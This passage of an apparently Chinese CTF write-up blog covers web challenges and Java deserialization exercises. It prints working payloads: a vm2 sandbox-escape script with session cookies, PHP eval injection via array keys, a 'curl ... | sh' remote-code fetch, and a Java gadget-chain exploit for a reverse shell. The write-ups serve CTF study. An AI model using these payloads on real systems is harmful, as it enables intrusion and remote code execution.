<span class="number">123</span>,<span class="string">&quot;properties&quot;</span>:&#123;<span class="string">&quot;length&quot;</span>: <span class="number">1</span>,<span class="string">&quot;0&quot;</span>:&#123;<span class="string">&quot;0&quot;</span>: <span class="string">&quot;vm2_tester&quot;</span>,<span class="string">&quot;length&quot;</span>:<span class="number">1</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230523203841137.png" alt="image-20230523203841137"></p><p>gpt给出的解释</p><p>这里能这样写来绕过是因为</p><p><img src="../images/image-20230523204429937.png" alt="image-20230523204429937"></p><p>这三个地方的缘故</p><p>其实就是跟上面的这个<code>copyArray</code>函数有很大的关系</p><p><code>&#123;&quot;name&quot;: 123,&quot;properties&quot;:&#123;&quot;length&quot;: 1,&quot;0&quot;:&#123;&quot;0&quot;: &quot;vm2_tester&quot;,&quot;length&quot;:1&#125;&#125;&#125;</code></p><p>就是<code>properties</code>这个key值的长度是1，然后又因为arr1[0]是一个对象，然后满足第一个判断，然后到最后返回的<code>arr2</code>就是<code>&#123;&quot;0&quot;:&#123;&quot;0&quot;: &quot;vm2_tester&quot;,&quot;length&quot;:1&#125;&#125;</code>这个玩意了</p><p>然后<code>req.session.user.properties[i]</code>就等于<code>&#123;&quot;0&quot;:&#123;&quot;0&quot;: &quot;vm2_tester&quot;,&quot;length&quot;:1&#125;&#125;</code></p><p><img src="../images/image-20230523205118270.png" alt="image-20230523205118270"></p><p>这样的话就可以同时解决上面提出的矛盾了   主要还是归功于上面的那个<code>copyArray</code>函数了</p><p><strong>最后的code代码执行就是前面搜的那篇文章里的内容了</strong></p><p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a></p><p><img src="../images/image-20230523205306489.png" alt="image-20230523205306489"></p><p>然后这里得需要python发包，bp和hackbar不行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://116.236.144.37:26806/vm2&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;eval(\&quot;const stack=()=&gt;&#123;new Error().stack;stack();&#125;;err = &#123;&#125;;const handler = &#123;getPr\&quot;+\&quot;ototypeOf(target) &#123;(stack)();&#125;&#125;;const proxiedErr = new Proxy(err, handler);try &#123;throw proxiedErr;&#125; catch (&#123;constructor: c&#125;) &#123;c.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /f*&#x27;);&#125;\&quot;)&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;rt_web_csrf_token=kOIwOsYocCJkXVKSQmTFWuvDWpVuizhu013Lxk78cg54iyChQBApFDCItboLOJeW; rt_web__jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZDRkMzhkNTVmYTdlZTIxYTgzODQ2MTUyNjg3NWYyMDMiLCJ1c2VybmFtZSI6IjE1Nzk5MDYwODUyIiwiZXhwIjoxNjg0OTMwNTY5LCJlbWFpbCI6IjE0Nzg0NTYzMDlAcXEuY29tIn0.M_dtAsuFk53-OccuslbUMB8s1BgQTF4LnBNp6gYecJ4; connect.sid=s%3AMrWVq2g4AyaXTVVHfmYR-lk66QfcMNuC.2bEPGUZvaMBVCw7UlneXFQjT4t9oTEzCW6x4HkCtHkI·&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, json=data, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230523205848825.png" alt="image-20230523205848825"></p><p>这里记得把cookie给换上自己的</p><h2 id="easy-log"><a href="#easy-log" class="headerlink" title="easy_log"></a>easy_log</h2><p>题目是长这样的</p><p><img src="../images/image-20230523210140219.png" alt="image-20230523210140219"></p><p><img src="../images/image-20230523210119944.png" alt="image-20230523210119944"></p><p>就是通过自己输入的值，来到这个php文件里执行代码，当然也过滤了很多东西</p><p><img src="../images/image-20230523210328183.png" alt="image-20230523210328183"></p><p>php文件里就是这些内容 </p><p>这里的话因为username被过滤太多东西了，<strong>php标记</strong>全给过滤掉了</p><p>于是我们就去看看ip或者uri能不能传值</p><p><img src="../images/image-20230523210917110.png" alt="image-20230523210917110"></p><p><img src="../images/image-20230523210923513.png" alt="image-20230523210923513"></p><p>写是写进去了，但是并没有执行</p><p>然后查看源码发现</p><p><img src="../images/image-20230523210956502.png" alt="image-20230523210956502"></p><p>这里的把<code>&lt;</code>给换掉了，那么我们就得另寻出路了</p><p>真正的解法就是传数组，这里的话waf只对参数的值的有用，对参数名是没有用的，</p><p><code>username[xxx]=123</code></p><p>就是后端只会检测123，并不会检测xxx</p><p>所以我们就可以利用这个方法来传参</p><p>直接用超级编码法</p><p><code>password=asd&amp;username[&lt;?php%20eval(base64_decode(c3lzdGVtKCJscyAvIik7));?&gt;]=123</code></p><p>这是编码内容是<code>system(&#39;ls /&#39;);</code></p><p>然后读出文件名</p><p><code>password=asd&amp;username[&lt;?php%20eval(base64_decode(c3lzdGVtKCdjYXQgL1MzcmVjdF8xU19IM3JlJyk7));?&gt;]=123</code></p><p><img src="../images/image-20230523211833958.png" alt="image-20230523211833958"></p><p>然后就读到了flag</p><h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p>题目</p><p><img src="../images/image-20230523212029359.png" alt="image-20230523212029359"></p><p>就是绕过关键字的过滤</p><p>这里的话我使用迷你下标进行绕过的(在之前的d3学到的这个)</p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ₑval(__impₒrt__(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).pₒpen(<span class="string">&#x27;curl https://your-shell.com/xxxx:666 |sh&#x27;</span>).read())</span><br></pre></td></tr></table></figure><h2 id="fun-java"><a href="#fun-java" class="headerlink" title="fun_java"></a>fun_java</h2><p><img src="../images/image-20230523212639053.png" alt="image-20230523212639053"></p><p><strong>Jckson调getter，然后TemplatesImpl命令执行，和阿里云bypass_1差不多，但我没做出来</strong></p><p><strong>这是个文章开头给的链接的那个师傅写的</strong>(这里话先去看看<strong>bypass_1</strong>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/05/21/%e7%ac%ac%e5%85%ab%e5%b1%8a%e4%b8%8a%e6%b5%b7%e5%b8%82%e5%a4%a7%e5%ad%a6%e7%94%9f%e7%</summary>
      
    
    
    
    
    <category term="上海磐石行动-web-2023" scheme="https://ke1nys.github.io/tags/%E4%B8%8A%E6%B5%B7%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-web-2023/"/>
    
  </entry>
  
  <entry>
    <title>java-反序列化题目</title>
    <link href="https://ke1nys.github.io/posts/450c467.html"/>
    <id>https://ke1nys.github.io/posts/450c467.html</id>
    <published>2023-05-22T06:43:58.000Z</published>
    <updated>2023-05-25T12:14:11.782Z</updated>
    
    <content type="html"><![CDATA[<p>这里的话是记录一下关于java反序列化的刷题</p><p><strong>(因为刚把一些链子给跟完)</strong></p><h2 id="东华杯ezgadget"><a href="#东华杯ezgadget" class="headerlink" title="东华杯ezgadget"></a>东华杯ezgadget</h2><p>原题的jar包 可以把代码拷出来自己跑下<br>链接：<a href="https://pan.baidu.com/s/1t5-fV7SUETDEI5-qbZZQrw">https://pan.baidu.com/s/1t5-fV7SUETDEI5-qbZZQrw</a><br>提取码：8do5</p><p><code>java -jar ezgadget.jar</code>在kali或者自己的服务器上运行跑一下，搭建一个环境</p><p>拿到jar包后先放到<strong>jd-gui</strong>里面进行反编译一下</p><p>然后在导到idea进行测试(<strong>这里的话是得根据题目自己创建package来导入</strong>)</p><p><img src="../images/image-20230522161955641.png" alt="image-20230522161955641"></p><p>导入到idea里后，进行代码审计</p><p>先是查看<code>pom.xml</code>看有无一些常见链子的依赖</p><p><img src="../images/image-20230522162058331.png" alt="image-20230522162058331"></p><p>这里的话是没有</p><p><strong>Tools.java</strong></p><p><img src="../images/image-20230522162207881.png" alt="image-20230522162207881"></p><p>这里提供了他一些函数是进行base64编码和解码的，还有序列化和反序列化的</p><p><strong>IndexController.java</strong></p><p><img src="../images/image-20230522163815734.png" alt="image-20230522163815734"></p><p><strong>TostringBean.java</strong></p><p><img src="../images/image-20230522162343938.png" alt="image-20230522162343938"></p><p>这里话是提供了一个动态类加载的<code>defineClass</code>方法     并且还会实例化</p><p>这里话就说明了这道题是不出网的，得在自己本地执行编译过的恶意代码</p><p>那么我们就得找一下谁调用了这个<code>TostringBean.toString()</code>方法</p><p>这里如果对cc链比较熟悉的话，一下就能猜出来了</p><p><img src="../images/image-20230522163614748.png" alt="image-20230522163614748"></p><p>cc5这条链子就有一个类的<code>readObject</code>方法是调用这个<code>toSting</code>方法的</p><p>于是调用链就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readobject  --&gt; ToStringBean.toString</span><br></pre></td></tr></table></figure><p>于是我们就开始写exp</p><p>这里的话先从执行代码那部分开始写</p><p><img src="../images/image-20230522164138690.png" alt="image-20230522164138690"></p><p>这里话是得使用反射调用来给这个参数赋值</p><p><strong>这里附的值就是我们本地的编译过的恶意代码</strong></p><p><img src="../images/image-20230522164815484.png" alt="image-20230522164815484"></p><p><img src="../images/image-20230522165301451.png" alt="image-20230522165301451"></p><p>然后就把执行代码的这部分写完了</p><p>接下来就是写使用<code>BadAttributeValueExpException.readobject</code>来触发<code>toString</code>这个函数了</p><p>先跟进去看一下这个类</p><p><strong>先看他的构造函数</strong></p><p><img src="../images/image-20230522165750768.png" alt="image-20230522165750768"></p><p>在实例化的时候会执行这个方法，赋值就会执行toString方法，但是这里我们不能直接传Tostingbean方法，因为如果这里进行了调用了话，readobject方法的时候在调用会报错</p><p>所以这里的我们在实例化的时候就随便传一个值。</p><p><strong>在看一下他的readobject方法</strong></p><p><img src="../images/image-20230522165951342.png" alt="image-20230522165951342"></p><p>就是会获取val这个参数的值并赋给valObj这个参数，然后在最后的时候就会调用valObj.toString()方法</p><p>所以关键点就在这个val参数这里，这里的话我们就可以考虑使用反射调用来进行修改这里的值</p><p><img src="../images/image-20230522170424460.png" alt="image-20230522170424460"></p><p>这样就写好了</p><p>然后因为在这个/readobject路由里还得满足一些要求才能进行反序列化</p><p><img src="../images/image-20230522170453923.png" alt="image-20230522170453923"></p><p><img src="../images/image-20230522170752259.png" alt="image-20230522170752259"></p><p>这样就全部写完了</p><p>但是这里得需要先进行解码，所以我们还得对字节流进行编码</p><p><img src="../images/image-20230522170835166.png" alt="image-20230522170835166"></p><p><img src="../images/image-20230522171128098.png" alt="image-20230522171128098"></p><p>进行了编码</p><p>然后输出</p><p><img src="../images/image-20230522172417365.png" alt="image-20230522172417365"></p><p>然后将编码后的结果进行<strong>url编码</strong>，然后data传参就行了(<strong>必须得进行url编码 </strong>)</p><p>就可以成功反弹shell了</p><p><strong>EXP.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.Tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> toStringBean.getClass().getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ctf application\\idea\\IntelliJ IDEA Community Edition 2022.3.1\\project\\ezgadget\\target\\classes\\com\\ezgame\\ctf\\payload.class&quot;</span>));</span><br><span class="line">        field.set(toStringBean,bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123123123</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filed.set(badAttributeValueExpException,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Tools.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>妈的  吐槽一下  这里的话得需要jdk1.8来运行jar包   如果用jdk17的话   会shell弹不上去</strong>(这里卡了好久，晕了)</p><h2 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2><p>考点</p><p><a href="https://tttang.com/archive/1877/#toc_mysql-jdbc">MYSQL JDBC反序列化解析</a>  </p><p><a href="https://blog.csdn.net/RABCDXB/article/details/124003575">参考文章</a></p><p><strong>jdbc反序列化 (jdbc sql注入)  rome链</strong></p><p>先下载jar包，然后丢进jd-gui里进行分析</p><p><img src="../images/image-20230525105104895.png" alt="image-20230525105104895"></p><p>这里的话就只给了部分代码</p><p><strong>Row.java</strong></p><p>就是自己写了有个Row类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Row</span> &#123;</span><br><span class="line">  String name;</span><br><span class="line">  </span><br><span class="line">  String type;</span><br><span class="line">  </span><br><span class="line">  String def;</span><br><span class="line">  </span><br><span class="line">  String isNull;</span><br><span class="line">  </span><br><span class="line">  String isAuto;</span><br><span class="line">  </span><br><span class="line">  String remark;</span><br><span class="line">  </span><br><span class="line">  String isPK;</span><br><span class="line">  </span><br><span class="line">  String size;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getIsPK</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isPK;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIsPK</span><span class="params">(String isPK)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.isPK = isPK;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setType</span><span class="params">(String type)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getDef</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.def;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDef</span><span class="params">(String def)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.def = def;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getIsNull</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isNull;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIsNull</span><span class="params">(String isNull)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.isNull = isNull;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getIsAuto</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isAuto;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIsAuto</span><span class="params">(String isAuto)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.isAuto = isAuto;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getRemark</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.remark;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRemark</span><span class="params">(String remark)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.remark = remark;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getSize</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.size;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSize</span><span class="params">(String size)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.size = size;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Row</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Row</span><span class="params">(String name, String type, String def, String isNull, String isAuto, String remark, String isPK, String size)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.def = def;</span><br><span class="line">    <span class="built_in">this</span>.isNull = isNull;</span><br><span class="line">    <span class="built_in">this</span>.isAuto = isAuto;</span><br><span class="line">    <span class="built_in">this</span>.remark = remark;</span><br><span class="line">    <span class="built_in">this</span>.isPK = isPK;</span><br><span class="line">    <span class="built_in">this</span>.size = size;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>SqlDict.java</strong></p><p>连接数据库，其中sql语句处存在sql注入漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Row;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Table;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DatabaseMetaData;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDict</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (dbName != <span class="literal">null</span> &amp;&amp; !dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">if</span> (user == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">        user = <span class="string">&quot;root&quot;</span>; </span><br><span class="line">      <span class="keyword">if</span> (pass == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">        pass = <span class="string">&quot;abc@12345&quot;</span>; </span><br><span class="line">      conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">      var5.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">      var6.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> conn;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title function_">getTableData</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">    List&lt;Table&gt; Tables = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> getConnection(dbName, user, pass);</span><br><span class="line">    <span class="type">String</span> <span class="variable">TableName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">      <span class="type">DatabaseMetaData</span> <span class="variable">metaData</span> <span class="operator">=</span> conn.getMetaData();</span><br><span class="line">      <span class="type">ResultSet</span> <span class="variable">tableNames</span> <span class="operator">=</span> metaData.getTables((String)<span class="literal">null</span>, (String)<span class="literal">null</span>, (String)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;TABLE&quot;</span> &#125;);</span><br><span class="line">      <span class="keyword">while</span> (tableNames.next()) &#123;</span><br><span class="line">        TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">        <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> <span 